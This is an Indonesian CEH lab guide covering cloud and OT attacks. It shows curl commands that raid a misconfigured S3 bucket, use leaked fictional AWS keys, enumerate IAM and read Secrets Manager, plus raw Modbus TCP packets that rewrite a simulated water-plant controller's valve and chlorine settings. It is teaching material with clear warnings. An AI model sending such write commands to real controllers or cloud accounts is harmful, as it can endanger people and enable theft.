# Lab 08 - Cloud dan IoT hacking

Modul CEH 18 dan 19 - IoT and OT Hacking plus Cloud Computing | 90 menit | Level 3

## Yang dibuktikan di lab ini

Anda membuktikan bahwa satu bucket S3 yang salah konfigurasi cukup untuk
menyerahkan kunci akses produksi, dan bahwa kunci itu membuka jalan ke pengguna
IAM yang boleh melakukan apa saja. Setelah itu Anda membuktikan hal yang lebih
telanjang lagi di sisi OT: protokol Modbus TCP tidak punya autentikasi sama
sekali, jadi siapa pun yang bisa membuka soket ke port 502 bisa membaca dan
MENGUBAH isi kontroler.

Nyambungnya ke exam: Modul 19 Cloud Computing untuk bucket terbuka, kredensial
yang ke-hardcode, dan policy IAM dengan wildcard. Modul 18 IoT and OT Hacking
untuk enumerasi Modbus dan alasan protokol OT tidak punya autentikasi.

## Waktu

90 menit, dan angka itu memang sempit karena sesi ini dipakai review juga.

| Bagian | Langkah | Perkiraan |
|---|---|---|
| Cloud | 1 sampai 7 | 45 menit |
| IoT | 8 sampai 11 | 30 menit |
| Catatan bukti dan ceklis | - | 15 menit |

Kalau waktunya mepet, langkah yang tidak boleh dilewat adalah 3, 5, 6, dan 11.
Empat itu yang paling sering keluar di exam.

## Peringatan dan batas

**Langkah 11 mengubah keadaan kontroler.** Itu memang tujuannya, dan di lab ini
aman karena yang berubah cuma angka di dalam container. Di lapangan perintah
yang sama persis membuka katup, mematikan pompa, atau mengubah dosis kimia.
Menulis ke perangkat OT yang bukan milik Anda bukan pengujian, itu bisa jadi
perkara pidana dan bisa melukai orang. Di pekerjaan nyata, aktivitas tulis ke
sistem OT butuh izin tertulis yang menyebut perangkatnya satu per satu.

**Semua nama di lab ini fiksi.** Nusatera Hidro bukan perusahaan yang ada. Semua
kunci akses, sandi, dan nama pegawai di dalamnya dibuat-buat dan tidak berlaku
di mana pun.

**Jaringan lab ini terkurung total.** Dari dalam toolbox tidak ada jalan ke
internet dan tidak ada jalan ke jaringan kelas. Kalau Anda mengarahkan nmap ke
subnet kelas, nmap menjawab bahwa rutenya tidak ada dan nol host discan. Itu
perilaku yang benar, bukan kerusakan. Yang boleh Anda serang cuma dua nama yang
disebut di tabel Peta lab di bawah.

**Kunci akses yang Anda temukan berubah tiap kali lab dinyalakan ulang.** Kunci
itu dibuat baru oleh penyemai setiap kali container cloud lahir. Jadi jangan
menyalin kunci dari catatan teman atau dari layar instruktur, baca sendiri dari
berkasnya.

## Menyalakan

```
./lab up 08          # macOS, Linux
.\lab.cmd up 08      # Windows
```

Penyalaan butuh sekitar 45 detik, diukur dua kali pada 2026-08-06 dengan hasil
44 dan 41 detik. Yang paling lama bukan boot LocalStack, tapi penyemaian akun
palsunya. Perintah di atas baru selesai setelah penyemaian beres, jadi kalau
prompt sudah kembali, datanya sudah siap.

Angka 45 detik itu berlaku kalau image-nya SUDAH ada di laptop Anda. Image
LocalStack besar, 431 MB unduhan dan 1.74 GB terpasang, jadi tarik di rumah
jauh hari sebelum kelas:

```
./lab pull core          # macOS, Linux
.\lab.cmd pull core      # Windows
```

Terminal penyerang: `./lab sh 08`

Semua perintah di bawah diketik di terminal itu, bukan di terminal laptop Anda.

## Peta lab

| Container | Perannya | Alamat dari dalam toolbox |
|---|---|---|
| toolbox | tempat Anda mengetik | - |
| cloud | endpoint AWS palsu, LocalStack | `cloud` port 4566 |
| plc | kontroler Modbus TCP | `plc` port 502 |

Dari dalam toolbox, panggil target memakai NAMANYA. `curl http://cloud:4566/`
jalan, `curl http://localhost:4566/` tidak jalan, karena tiap container punya
localhost sendiri.

Dari browser laptop Anda, dua port ini dipublish:
`http://localhost:8800` untuk cloud dan port 8802 untuk plc.

## Kenapa tidak ada AWS CLI di toolbox

Ini disengaja. Sepanjang bagian cloud Anda memakai `curl` dan HTTP polos.

Alasannya bukan penghematan. AWS CLI menyembunyikan bentuk permintaannya, dan
yang diuji di exam justru bentuk itu: nama Action, versi API, cara S3
mengalamati bucket, dan letak kredensial di header. Kalau Anda pernah sekali
melihat `Action=ListUsers&Version=2010-05-08` melintas sebagai body HTTP biasa,
soal tentang enumerasi IAM berhenti terasa abstrak.

Efek sampingnya juga berguna: apa yang Anda lakukan di sini bisa Anda ulang dari
mesin mana pun yang punya curl, tanpa memasang apa-apa.

---

# BAGIAN SATU, CLOUD

## Langkah 1. Pastikan endpoint hidup dan layanan apa saja yang jalan

```
curl -s http://cloud:4566/_localstack/health | python3 -m json.tool | grep -E "running|edition|version"
```

Yang mestinya kelihatan:

```
        "iam": "running",
        "kms": "running",
        "lambda": "running",
        "s3": "running",
        "secretsmanager": "running",
        "sts": "running",
    "edition": "community",
    "version": "4.9.2"
```

Empat layanan yang Anda pakai hari ini ada di daftar itu: s3, iam, sts, dan
secretsmanager.

<details><summary>Kalau macet, buka ini</summary>

Kalau curl menjawab kosong atau `Could not resolve host: cloud`, container
cloud belum siap atau namanya salah ketik. Tunggu 20 detik lalu ulangi. Masih
gagal, keluar dari toolbox dan jalankan `./lab reset 08`.
</details>

## Langkah 2. Temukan nama bucket dengan menebak

Nama bucket S3 itu global dan tidak rahasia, jadi menebaknya adalah teknik
pengintaian yang sah dan sangat sering berhasil. Polanya hampir selalu nama
perusahaan digabung kata yang menerangkan isinya.

```
for b in $(grep -v "^#" /lab/files/nama-bucket.txt); do
  kode=$(curl -s -o /dev/null -w "%{http_code}" "http://cloud:4566/$b/?list-type=2")
  [ "$kode" = "200" ] && echo "KETEMU  $b"
done
```

Yang mestinya kelihatan, dua baris dari dua puluh lima tebakan:

```
KETEMU  nusatera-arsip-publik
KETEMU  nusatera-arsip-internal
```

Yang membedakan ada dan tidak ada adalah kode HTTP. Bucket yang ada menjawab
200, yang tidak ada menjawab 404 dengan kode `NoSuchBucket`. Coba sendiri:

```
curl -s "http://cloud:4566/nusatera-tidak-ada/?list-type=2"
```

## Langkah 3. Cari tahu KENAPA bucket itu terbuka

Menemukan bucket itu setengah pekerjaan. Yang ditulis di laporan adalah sebab
teknisnya, dan sebabnya ada di dua tempat.

Pertama, bucket policy:

```
curl -s "http://cloud:4566/nusatera-arsip-publik/?policy" | python3 -m json.tool
```

Yang mestinya kelihatan:

```
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Sid": "SemuaOrangBolehBaca",
            "Effect": "Allow",
            "Principal": "*",
            "Action": [
                "s3:GetObject",
                "s3:ListBucket"
            ],
            "Resource": [
                "arn:aws:s3:::nusatera-arsip-publik",
                "arn:aws:s3:::nusatera-arsip-publik/*"
            ]
        }
    ]
}
```

`"Principal": "*"` itu temuannya. Artinya siapa pun, tanpa akun AWS sekalipun.

Kedua, Block Public Access. Ini pengaman tingkat bucket yang seharusnya
membatalkan policy di atas. Bandingkan dua bucket:

```
curl -s "http://cloud:4566/nusatera-arsip-publik/?publicAccessBlock"
echo
curl -s "http://cloud:4566/nusatera-arsip-internal/?publicAccessBlock"
```

Yang mestinya kelihatan, empat nilai `false` di bucket pertama dan empat nilai
`true` di bucket kedua:

```
<PublicAccessBlockConfiguration ...><BlockPublicAcls>false</BlockPublicAcls><IgnorePublicAcls>false</IgnorePublicAcls><BlockPublicPolicy>false</BlockPublicPolicy><RestrictPublicBuckets>false</RestrictPublicBuckets></PublicAccessBlockConfiguration>
<PublicAccessBlockConfiguration ...><BlockPublicAcls>true</BlockPublicAcls><IgnorePublicAcls>true</IgnorePublicAcls><BlockPublicPolicy>true</BlockPublicPolicy><RestrictPublicBuckets>true</RestrictPublicBuckets></PublicAccessBlockConfiguration>

```

Jadi temuannya bukan satu kesalahan, tapi dua yang kebetulan bertemu. Policy
memberi akses ke semua orang, dan pengaman yang tugasnya membatalkan policy
seperti itu sudah dimatikan lebih dulu.

## Langkah 4. Daftar isinya, lalu ambil yang menarik

```
curl -s "http://cloud:4566/nusatera-arsip-publik/?list-type=2" | grep -oP "(?<=<Key>)[^<]+"
```

Yang mestinya kelihatan:

```
cadangan/app-produksi.env
dokumen/runbook-ot.txt
index.html
```

Perhatikan bahwa `index.html` tidak menautkan dua berkas lainnya. Di S3 itu
lumrah: tidak ada yang menautkan bukan berarti tidak ada yang bisa menemukan,
karena ListBucket memberi Anda daftarnya langsung.

Sekarang ambil berkas konfigurasinya:

```
curl -s http://cloud:4566/nusatera-arsip-publik/cadangan/app-produksi.env | grep -E "AWS_|DB_PASSWORD"
```

Yang mestinya kelihatan, dengan nilai kunci yang berbeda di laptop Anda:

```
DB_PASSWORD=Tirta#Nusa2026!
AWS_DEFAULT_REGION=us-east-1
AWS_ACCESS_KEY_ID=LKIAQAAAAAAAPB4YR37H
AWS_SECRET_ACCESS_KEY=4hJgCbaK0DBPUxEX9EaB1jJImfAUF2JtWup4ZaNM
```

Ini salah konfigurasi ketiga, dan yang paling sering terjadi di dunia nyata:
kredensial ditulis langsung di berkas konfigurasi, lalu berkasnya ikut
tercadangkan ke tempat yang salah.

Jangan tutup dulu, berkas kedua dipakai di bagian dua:

```
curl -s http://cloud:4566/nusatera-arsip-publik/dokumen/runbook-ot.txt | head -20
```

## Langkah 5. Buktikan kunci yang bocor itu punya siapa

Kunci tanpa identitas tidak bisa ditulis di laporan. Tanya ke STS:

```
AK=$(curl -s http://cloud:4566/nusatera-arsip-publik/cadangan/app-produksi.env | grep AWS_ACCESS_KEY_ID | cut -d= -f2)
echo "kunci yang bocor: $AK"

curl -s -X POST http://cloud:4566/ \
  -H "Authorization: AWS4-HMAC-SHA256 Credential=$AK/20260806/us-east-1/sts/aws4_request, SignedHeaders=host, Signature=00" \
  -d "Action=GetCallerIdentity&Version=2011-06-15" | grep -oP "(?<=<Arn>)[^<]+"
```

Yang mestinya kelihatan:

```
kunci yang bocor: LKIAQAAAAAAAPB4YR37H
arn:aws:iam::000000000000:user/deploy-bot
```

`GetCallerIdentity` adalah perintah pertama yang dijalankan hampir semua orang
setelah mendapat kredensial AWS, persis karena itu: dia menjawab "saya ini
siapa" dan tidak butuh izin apa pun.

Perhatikan juga bentuk header `Authorization`. Kredensial AWS tidak pernah
dikirim sebagai user dan password. Yang dikirim adalah ID kunci di dalam
credential scope, dan tanda tangan HMAC dari isi permintaannya.

<details><summary>Kalau macet, buka ini</summary>

Kalau `$AK` kosong, berarti `grep` tidak menemukan barisnya. Cek dulu isi
berkasnya utuh: `curl -s http://cloud:4566/nusatera-arsip-publik/cadangan/app-produksi.env`

Kalau jawabannya `arn:aws:iam::000000000000:root`, berarti nilai `$AK` bukan ID
kunci yang valid, jadi STS jatuh ke identitas bawaan. Ulangi baris `AK=` di atas.
</details>

## Langkah 6. Enumerasi IAM, dan temukan policy yang kelewat longgar

Ini inti bagian cloud. Mulai dari daftar pengguna:

```
curl -s -X POST http://cloud:4566/ -d "Action=ListUsers&Version=2010-05-08" | grep -oP "(?<=<UserName>)[^<]+"
```

Yang mestinya kelihatan:

```
deploy-bot
svc-backup
magang-2026
```

Lalu policy yang menempel di tiap pengguna:

```
for u in deploy-bot svc-backup magang-2026; do
  p=$(curl -s -X POST http://cloud:4566/ -d "Action=ListUserPolicies&UserName=$u&Version=2010-05-08" | grep -oP "(?<=<member>)[^<]+")
  echo "$u -> $p"
done
```

Yang mestinya kelihatan:

```
deploy-bot -> AksesPenuhSementara
svc-backup -> RotasiKunciBackup
magang-2026 -> BacaLaporanSaja
```

Sekarang baca isi policy milik pengguna yang kuncinya sudah Anda pegang. AWS
mengembalikan dokumen policy dalam bentuk URL encoded, jadi harus didekode:

```
curl -s -X POST http://cloud:4566/ -d "Action=GetUserPolicy&UserName=deploy-bot&PolicyName=AksesPenuhSementara&Version=2010-05-08" \
 | grep -oP "(?<=<PolicyDocument>)[^<]+" \
 | python3 -c "import sys,urllib.parse,json;print(json.dumps(json.loads(urllib.parse.unquote(sys.stdin.read())),indent=2))"
```

Yang mestinya kelihatan:

```
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "SementaraSajaKatanya",
      "Effect": "Allow",
      "Action": "*",
      "Resource": "*"
    }
  ]
}
```

`Action: *` bertemu `Resource: *` adalah administrator, apa pun nama policy-nya.
Nama `AksesPenuhSementara` juga bagian dari temuan: yang sementara di cloud
punya kebiasaan jadi permanen, dan tidak ada satu pun mekanisme AWS yang
mencabutnya sendiri.

Ulangi perintah yang sama untuk dua pengguna lain, dan bandingkan bentuknya.
Satu di antaranya kelihatan sempit padahal tidak. Itu bahan Pertanyaan nomor 3.

## Langkah 7. Ambil yang dijaga

Rantainya selesai kalau ada sesuatu yang beneran diambil. Lihat isi Secrets
Manager:

```
curl -s -X POST http://cloud:4566/ \
  -H "Content-Type: application/x-amz-json-1.1" \
  -H "X-Amz-Target: secretsmanager.ListSecrets" -d "{}" | python3 -m json.tool | grep '"Name"'
```

```
curl -s -X POST http://cloud:4566/ \
  -H "Content-Type: application/x-amz-json-1.1" \
  -H "X-Amz-Target: secretsmanager.GetSecretValue" \
  -d '{"SecretId":"nusatera/prod/basisdata"}' \
  | python3 -c "import sys,json;print(json.load(sys.stdin)['SecretString'])"
```

Yang mestinya kelihatan:

```
            "Name": "nusatera/prod/basisdata",
{"host":"db-produksi.internal","user":"root","pass":"R0ot-Tirta-2026"}
```

Perhatikan bentuk permintaannya berbeda dari IAM dan STS. IAM dan STS memakai
protokol query, yaitu form biasa dengan parameter `Action`. Secrets Manager
memakai protokol JSON, yaitu badan JSON plus header `X-Amz-Target` yang berisi
nama layanan dan operasinya. Dua bentuk ini yang dipakai hampir semua API AWS,
dan mengenali bedanya berguna waktu membaca lalu lintas hasil sadapan.

---

# BAGIAN DUA, IoT DAN OT

Runbook yang Anda ambil di langkah 4 menyebut host `plc` port 502 unit ID 1,
plus peta registernya. Itulah gunanya dokumen bocor: dia menghemat seluruh fase
tebak-tebakan. Kalau belum sempat membacanya:

```
curl -s http://cloud:4566/nusatera-arsip-publik/dokumen/runbook-ot.txt
```

## Langkah 8. Kenali perangkatnya dengan nmap

```
nmap -p 502 --script modbus-discover plc
```

Yang mestinya kelihatan:

```
PORT    STATE SERVICE
502/tcp open  modbus
| modbus-discover:
|   sid 0x1:
|     Slave ID data: Pymodbus-PM-3.12.1\xFF
|_    Device identification: Pymodbus PM 3.12.1
```

Berhenti sebentar di sini. Perangkat itu baru saja menyebutkan merek dan versi
firmware-nya kepada mesin yang tidak pernah dia kenal, tanpa diminta login.
Yang dipakai `modbus-discover` adalah fungsi Modbus 17 Report Slave ID dan 43
Read Device Identification, dua fungsi yang memang ada di standarnya.

<details><summary>Kalau macet, buka ini</summary>

Kalau nmap menampilkan port 502 open tapi baris `modbus-discover` tidak muncul
sama sekali, kemungkinan besar Anda mengetik port lain. Skrip `modbus-discover`
punya aturan port bawaan 502 dan tidak akan jalan di port lain kecuali dipaksa.

Kalau butuh melihat lebih banyak slave ID, tambahkan
`--script-args='modbus-discover.aggressive=true'`. Keluarannya panjang, karena
dia mencoba 246 alamat slave.
</details>

## Langkah 9. Satu permintaan mentah, dan ini poin utamanya

Sekarang kirim satu permintaan Modbus dengan tangan. Dua belas byte, tanpa
pustaka apa pun:

```
{ printf '\x00\x01\x00\x00\x00\x06\x01\x03\x00\x00\x00\x04'; sleep 1; } | ncat -w 3 plc 502 | od -An -tx1
```

Yang mestinya kelihatan:

```
 00 01 00 00 00 0b 01 03 08 05 aa 00 0c 0b b8 00
 01
```

Bacanya begini. Yang dikirim:

| byte | isi | arti |
|---|---|---|
| 00 01 | Transaction ID | dipilih bebas oleh klien |
| 00 00 | Protocol ID | selalu nol untuk Modbus |
| 00 06 | panjang | sisa pesan enam byte |
| 01 | Unit ID | alamat slave |
| 03 | kode fungsi | Read Holding Registers |
| 00 00 | alamat awal | register nol |
| 00 04 | jumlah | empat register |

Yang diterima: header yang sama, lalu `08` sebagai jumlah byte data, lalu empat
angka enam belas bit. `05 aa` sama dengan 1450, `00 0c` sama dengan 12,
`0b b8` sama dengan 3000, dan `00 01` sama dengan 1. Cocokkan dengan runbook:
putaran pompa, dosis klorin, batas tekanan, dan mode auto.

Sekarang perhatikan apa yang TIDAK ada di dua belas byte tadi. Tidak ada nama
pengguna, tidak ada sandi, tidak ada token, tidak ada sesi, tidak ada
negosiasi enkripsi. Tidak ada tempat untuk menaruhnya sekalipun Anda mau.
Itulah jawaban dari pertanyaan "kenapa protokol OT tidak punya autentikasi":
Modbus dirancang tahun 1979 untuk kabel serial sepanjang beberapa meter di
dalam satu pabrik, tempat siapa yang bisa menyentuh kabel sudah dianggap
berhak. Yang berubah kemudian bukan protokolnya, tapi kabelnya, yang diganti
jaringan IP dan akhirnya nyambung ke internet.

<details><summary>Kalau macet, buka ini</summary>

Kalau keluarannya kosong, kemungkinan besar Anda menjalankan perintah ini di
shell yang bukan bash. Perintah `printf` bawaan dash tidak mengerti `\x`, jadi
yang terkirim adalah teks `\x00\x01` apa adanya dan PLC diam saja. `./lab sh 08`
memberi Anda bash, jadi kalau Anda masuk lewat jalan lain, ketik `bash` dulu.

Cek cepat, harus keluar `00 01`:

```
printf '\x00\x01' | od -An -tx1
```
</details>

## Langkah 10. Dump seluruh register

Melakukan itu satu per satu dengan tangan tidak ada gunanya. Pakai skrip yang
sudah disediakan, isinya cuma pustaka bawaan Python dan layak dibaca:

```
python3 /lab/files/modbus-baca.py plc
```

Yang mestinya kelihatan:

```
target plc:502 unit 1

FC1  coil             alamat 0-15 : 1 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0
FC2  discrete input   alamat 0-15 : 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0
FC3  holding register alamat 0-15 : 1450 12 3000 1 0 0 0 0 0 0 20053 21313 21573 21057 11607 21584
FC4  input register   alamat 0-15 : 231 4870 2870 8 0 0 0 0 0 0 0 0 0 0 0 0

holding 10-17 tag perangkat       : 'NUSATERA-WTP-01A'
holding 30-36 catatan integrator  : 'SVC:tirta2019'
```

Dua baris terakhir itu temuan tersendiri. Register Modbus cuma angka enam belas
bit, dan tidak ada apa pun di protokolnya yang memberi tahu Anda bahwa
sekelompok angka sebenarnya teks. Penafsiran itu datang dari luar, dari
dokumentasi vendor atau dari coba-coba. Di sini `20053` adalah `0x4E55`, dan
dua byte itu adalah huruf `N` dan `U`.

Yang tertinggal di alamat 30 sampai 36 adalah kredensial servis yang ditulis
integrator ke dalam register supaya gampang diingat. Ini bukan skenario yang
dikarang untuk lab, ini pola yang ditemukan berulang kali di audit ICS.

## Langkah 11. Tulis, dan lihat kontrolernya menurut

Ini langkah yang paling penting di bagian dua, dan yang paling perlu
dipertanggungjawabkan. Baca dulu Peringatan di bagian atas README ini.

Baca dulu keadaan coil sekarang:

```
{ printf '\x00\x0a\x00\x00\x00\x06\x01\x01\x00\x00\x00\x08'; sleep 1; } | ncat -w 3 plc 502 | od -An -tx1
```

Yang mestinya kelihatan, perhatikan byte terakhir:

```
 00 0a 00 00 00 04 01 01 01 03
```

`03` adalah `0000 0011` dalam biner, dibaca dari bit paling kanan: coil 0 hidup,
coil 1 hidup, coil 2 mati. Sesuai runbook, artinya pompa intake hidup, pompa
dosing hidup, katup bypass tertutup.

Sekarang buka katup bypass, yaitu tulis coil 2 jadi hidup, dengan fungsi 5
Write Single Coil. Nilai `ff 00` berarti hidup, `00 00` berarti mati:

```
{ printf '\x00\x0b\x00\x00\x00\x06\x01\x05\x00\x02\xff\x00'; sleep 1; } | ncat -w 3 plc 502 | od -An -tx1
```

Yang mestinya kelihatan, PLC menggemakan perintah Anda sebagai tanda diterima:

```
 00 0b 00 00 00 06 01 05 00 02 ff 00
```

Baca ulang:

```
{ printf '\x00\x0c\x00\x00\x00\x06\x01\x01\x00\x00\x00\x08'; sleep 1; } | ncat -w 3 plc 502 | od -An -tx1
```

Yang mestinya kelihatan, `03` sudah berubah jadi `07`:

```
 00 0c 00 00 00 04 01 01 01 07
```

`07` adalah `0000 0111`. Coil 2 sekarang hidup. Dalam bahasa runbook: air
sekarang melewati unit dosing tanpa diolah, dan tidak ada satu pun sistem yang
diminta izin sebelum itu terjadi.

Konfirmasi lewat skrip kalau mau melihatnya lebih jelas:

```
python3 /lab/files/modbus-baca.py plc | head -4
```

## Langkah 12. Bukti

Salin ini ke catatan Anda dan isi. Kalau ada review di kelas, ini yang dibaca.

```
CLOUD
  bucket terbuka        :
  sebab teknisnya       :
  berkas yang bocor     :
  kunci milik pengguna  :
  policy yang bermasalah:
  yang berhasil diambil :

OT
  perangkat             :
  fungsi Modbus dipakai :
  nilai coil sebelum    :
  nilai coil sesudah    :
  dampak di dunia nyata :
```

## Pertanyaan

Jawabannya cuma ketemu kalau Anda beneran mengerjakan langkahnya.

1. Di langkah 3 ada dua setelan yang sama-sama salah. Kalau Anda cuma boleh
   memperbaiki SATU dan yang lain harus dibiarkan apa adanya, mana yang Anda
   perbaiki, dan kenapa yang itu lebih menutup daripada yang satunya?

2. ID kunci akses di langkah 4 diawali `LKIA`, bukan `AKIA` seperti kunci AWS
   sungguhan. Apa artinya awalan itu, dan kenapa penyerang yang menemukan
   sebaris `AKIA...` di repositori GitHub bisa langsung tahu itu jenis
   kredensial apa tanpa mencobanya dulu?

3. Baca ketiga policy di langkah 6 sampai habis. Satu di antara `svc-backup` dan
   `magang-2026` sebenarnya sama berbahayanya dengan `deploy-bot` walaupun
   Action-nya tidak ditulis `*`. Yang mana, baris mana yang membuatnya begitu,
   dan bagaimana urutan langkah yang dipakai penyerang untuk naik jadi
   administrator dari sana?

4. Di langkah 9 dan 11, apa persisnya yang membuat PLC mau menjalankan perintah
   Anda? Sebutkan kolom mana di dalam paket Modbus yang menyatakan hak akses.
   Kalau menurut Anda tidak ada, tulis kesimpulan apa yang mengikuti dari itu
   untuk pengamanan jaringan OT.

5. Di langkah 10, angka `21584` di holding register alamat 15 sebenarnya dua
   huruf. Huruf apa, dan tunjukkan hitungannya. Kalau Anda tidak punya runbook,
   apa yang bisa membuat Anda menduga sekelompok register itu berisi teks?

6. Nilai coil yang Anda ubah di langkah 11 hilang setelah `./lab reset 08`, tapi
   tidak hilang kalau container cuma di-restart tanpa dihapus. Apa artinya itu
   untuk sebuah PLC sungguhan yang perubahannya tersimpan di memori
   non-volatile, dan kenapa insiden OT sering baru ketahuan berhari-hari
   setelah kejadian?

## Tantangan tambahan

Buat yang sudah selesai sebelum waktunya habis. Kerjakan berurutan, makin ke
bawah makin susah.

1. **Ubah setpoint, bukan cuma saklar.** Fungsi 6 Write Single Register menulis
   satu holding register. Ubah dosis klorin di alamat 1 dari 12 jadi 250, lalu
   buktikan dengan membaca ulang. Bentuk paketnya sama dengan fungsi 5, yang
   berbeda cuma kode fungsi dan artinya dua byte terakhir. Petunjuk: 250
   desimal itu `00 fa`.

2. **Cari batas peta registernya.** Tulis loop yang membaca holding register
   satu per satu mulai dari alamat 0 dan naik terus, dan temukan alamat
   tertinggi yang masih dijawab. Catat exception code yang keluar di alamat
   pertama yang gagal. Naik satu-satu sampai ketemu akan lama sekali, jadi
   pikirkan cara mencarinya yang lebih cepat. Jawabannya jauh lebih besar dari
   yang Anda duga, dan pertanyaan sesungguhnya ada di situ: cuma sekitar
   empat puluh alamat yang punya arti, sisanya nol. Tidak ada apa pun di
   protokol Modbus yang memberi tahu Anda yang mana. Tulis satu kalimat tentang
   apa artinya itu untuk seseorang yang memetakan PLC tanpa punya dokumentasi.

3. **Enumerasi unit ID.** Runbook menyebut unit ID 1. Buktikan sendiri unit ID
   mana saja yang menjawab, dari 0 sampai 20. Hasilnya akan mengagetkan, dan
   itu memang bahan pelajarannya. Setelah dapat hasilnya, jawab dua hal: kenapa
   simulator ini berperilaku begitu, dan kenapa di lapangan justru penting
   menyapu unit ID satu per satu ketika yang Anda hadapi adalah **Modbus
   gateway**, yaitu satu alamat IP yang di belakangnya ada banyak perangkat
   serial yang dibedakan hanya oleh unit ID.

4. **Audit pengguna IAM yang tersisa.** Untuk `svc-backup` dan `magang-2026`,
   tulis satu paragraf per pengguna: apa yang boleh dia lakukan, apa yang
   sebenarnya bisa dia capai, dan satu kalimat perbaikan yang konkret. Ini
   latihan menulis temuan, bukan latihan mengetik perintah.

5. **Bandingkan dua bentuk API AWS.** Panggil `secretsmanager.DescribeSecret`
   dengan protokol JSON, lalu panggil `iam:ListAccessKeys` untuk `deploy-bot`
   dengan protokol query, dan catat perbedaan bentuk permintaan serta bentuk
   jawabannya. Ini paling cepat dikerjakan dengan menyalin perintah di langkah
   6 dan 7 lalu menggantinya seperlunya.

## Yang GA BISA dikerjain di lab ini, dan kenapa

Bagian ini bukan basa-basi. Kalau Anda membawa asumsi dari lab ini ke pekerjaan
nyata tanpa membaca bagian ini, Anda akan salah menyimpulkan.

**LocalStack tidak menegakkan IAM dan tidak menegakkan bucket policy.** Ini
batas yang paling penting. Diuji pada 2026-08-06 di mesin penyusun lab, termasuk
dengan `ENFORCE_IAM=1`: bucket `nusatera-arsip-internal` yang Block Public
Access-nya menyala penuh dan tidak punya policy publik sama sekali TETAP bisa
dibaca tanpa kredensial, dan jawabannya HTTP 200. Coba sendiri:

```
curl -s http://cloud:4566/nusatera-arsip-internal/hr/gaji-2026.csv
```

Di AWS sungguhan permintaan itu dijawab `403 AccessDenied` dengan badan XML
berisi kode `AccessDenied`. Konsekuensinya untuk cara Anda bekerja: di lab ini
Anda mengaudit KONFIGURASI, dan bukti temuan Anda adalah isi `?policy` dan
`?publicAccessBlock`, bukan kode HTTP-nya. Di AWS sungguhan kode HTTP itu justru
alat ukur utama Anda. Kebiasaan menyimpulkan "200 berarti terbuka" akan
menyesatkan Anda begitu keluar dari lab ini.

**Tanda tangan permintaan tidak diperiksa.** Header `Authorization` yang Anda
kirim di langkah 5 berisi `Signature=00`, dan itu diterima. Di AWS sungguhan
tanda tangan yang salah dijawab `SignatureDoesNotMatch`, dan secret access key
mutlak dibutuhkan, bukan cuma ID kuncinya. Itu juga sebabnya di langkah 6 dan 7
Anda bisa memanggil IAM tanpa header `Authorization` sama sekali. Jangan
menyimpulkan bahwa ID kunci saja sudah cukup di dunia nyata, karena tidak.

**Nol lapisan cloud yang lain.** Tidak ada EC2, tidak ada Lambda yang beneran
jalan, tidak ada metadata service di `169.254.169.254`, tidak ada asumsi peran
lintas akun. Serangan cloud yang paling sering dipakai di lapangan, yaitu SSRF
ke IMDS untuk mencuri kredensial peran instance, tidak bisa diperagakan di sini.
Lambda butuh soket Docker host, dan itu dilarang di repo ini karena container
yang bisa bicara ke soket Docker sudah setara root di laptop Anda.

**PLC-nya simulator, bukan perangkat keras.** Yang berubah waktu Anda menulis
coil cuma variabel di memori sebuah program Python. Tidak ada logika tangga,
tidak ada siklus scan, tidak ada I/O fisik, tidak ada interlock keselamatan.
Di lapangan justru interlock itu yang sering menjadi pembatas kerusakan, dan
kadang justru yang bikin perintah Anda ditolak tanpa alasan yang kelihatan.

**Simulator ini menjawab terlalu ramah.** Diukur pada 2026-08-06: dia menjawab
SEMUA unit ID dari 0 sampai 20, dan menjawab holding register sampai alamat
65534 sebelum akhirnya mengembalikan exception code 2 di alamat 65535. PLC
sungguhan biasanya cuma menjawab satu unit ID yang dikonfigurasi, dan
mengembalikan Illegal Data Address jauh lebih awal, di batas peta register yang
memang dipasang vendornya. Jadi jangan memakai lab ini untuk mengukur seperti
apa rasanya menyapu perangkat asli. Yang berlaku universal cuma satu: tidak ada
satu pun dari jawaban itu yang menanyakan siapa Anda.

**Nol Modbus RTU, nol protokol OT yang lain.** Yang Anda pegang cuma Modbus TCP.
Di lapangan Anda akan bertemu Modbus RTU di atas RS-485, DNP3, IEC 60870-5-104,
EtherNet/IP, dan S7comm. Semuanya punya bentuk paket sendiri, walaupun soal
autentikasinya kesimpulannya mirip.

**Nol segmentasi yang realistis.** Di lab ini toolbox dan PLC duduk di satu
jaringan datar. Di pabrik yang dikelola dengan benar ada model Purdue, ada DMZ
industri, dan PLC tidak pernah satu segmen dengan laptop siapa pun. Justru
karena itu, temuan paling berharga dalam pengujian OT sering bukan
"PLC-nya bisa ditulis", melainkan "ada jalan dari jaringan kantor sampai ke
sini". Perhatikan bahwa di lab ini jalan itu dibuka oleh sebuah dokumen di
bucket S3, dan itu memang sengaja.

## Nyambung ke exam

Pakai istilah persis ini, bukan parafrasenya.

- **S3 bucket enumeration** dan **misconfigured bucket policy**. Nama bucket itu
  global dan bisa ditebak. Dua setelan yang menentukan terbuka atau tidaknya
  adalah **bucket policy** dengan `Principal: "*"` dan **S3 Block Public
  Access** yang punya empat sakelar.
- **Hardcoded credentials**. Kredensial di berkas konfigurasi yang ikut
  tercadangkan. Mitigasinya **IAM role** untuk beban kerja, atau **AWS Secrets
  Manager**, bukan berkas `.env`.
- **Overly permissive IAM policy** dan **least privilege**. `Action: "*"`
  bertemu `Resource: "*"` sama dengan administrator. Wildcard di `iam:*` adalah
  jalur **privilege escalation** walaupun tidak kelihatan seperti wildcard penuh.
- **STS GetCallerIdentity** sebagai perintah pertama setelah mendapat kredensial.
- **Modbus TCP port 502**. **Function code** yang perlu diingat: 1 Read Coils,
  2 Read Discrete Inputs, 3 Read Holding Registers, 4 Read Input Registers,
  5 Write Single Coil, 6 Write Single Register.
- **Modbus tidak punya autentikasi, otorisasi, maupun enkripsi.** Ini jawaban
  langsung untuk soal bertipe "kenapa protokol OT rentan".
- **nmap --script modbus-discover** sebagai perkakas enumerasi Modbus yang
  disebut di materi. Nama lain yang layak dikenali walaupun tidak dipakai di
  sini: **Shodan** untuk menemukan perangkat ICS yang terbuka di internet,
  **PLCScan**, dan **Modscan**.
- **Purdue model** dan **segmentasi IT lawan OT** sebagai mitigasi utama, karena
  protokolnya sendiri memang tidak bisa diperbaiki.

## Ceklis, diisi sendiri

- [ ] Saya menemukan dua bucket dengan menebak, bukan diberi tahu namanya
- [ ] Saya bisa menunjuk DUA setelan yang bersama-sama membuat bucket itu terbuka
- [ ] Saya membuktikan kunci yang bocor itu milik pengguna IAM yang mana
